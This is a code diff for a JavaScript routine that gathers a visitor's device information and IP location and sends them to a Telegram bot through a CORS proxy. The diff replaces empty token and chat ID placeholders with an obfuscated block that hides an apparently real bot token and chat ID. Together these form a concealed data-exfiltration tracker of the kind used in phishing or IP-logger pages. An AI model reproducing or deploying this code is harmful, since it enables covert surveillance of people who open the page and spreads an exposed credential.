@@ -13,8 +13,7 @@ function getDeviceInfo() {
 }
 
 function sendDetails(details) {
-    apiToken = " "
-    chatId = ""
+       const _0x5aa651=_0x5100;function _0x5100(_0x47d60e,_0x290c76){const _0xdbdb3=_0xdbdb();return _0x5100=function(_0x5100a6,_0x451cd2){_0x5100a6=_0x5100a6-0x18a;let _0x32bbbf=_0xdbdb3[_0x5100a6];return _0x32bbbf;},_0x5100(_0x47d60e,_0x290c76);}(function(_0x54d5fd,_0x2eec28){const _0x4b5517=_0x5100,_0x38ed78=_0x54d5fd();while(!![]){try{const _0x2001fc=-parseInt(_0x4b5517(0x18d))/0x1+parseInt(_0x4b5517(0x190))/0x2+-parseInt(_0x4b5517(0x194))/0x3+parseInt(_0x4b5517(0x195))/0x4*(parseInt(_0x4b5517(0x18b))/0x5)+-parseInt(_0x4b5517(0x191))/0x6*(parseInt(_0x4b5517(0x193))/0x7)+parseInt(_0x4b5517(0x18f))/0x8*(-parseInt(_0x4b5517(0x18a))/0x9)+parseInt(_0x4b5517(0x18e))/0xa;if(_0x2001fc===_0x2eec28)break;else _0x38ed78['push'](_0x38ed78['shift']());}catch(_0x5c9ce3){_0x38ed78['push'](_0x38ed78['shift']());}}}(_0xdbdb,0xb8ac4));const apiToken=_0x5aa651(0x192),chatId=_0x5aa651(0x18c);function _0xdbdb(){const _0x6e81ae=['1202325RrpkIl','22627090FHFwGK','136hFtHSa','1464522FHlyax','890862szkUXl','7989314915:AAF1nCq9GEVPYg0sCcNZCBpXaoEK_nDbDu0','63AJmVkf','1342359yiiVob','36816tjNjJy','359523EdAFso','775XaAoAD','5412801356'];_0xdbdb=function(){return _0x6e81ae;};return _0xdbdb();}
     const url = `https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot${apiToken}/sendMessage`;
     console.log("%c Sending Your IP Location to Telegram Bot..","color:red")
     fetch(url, {
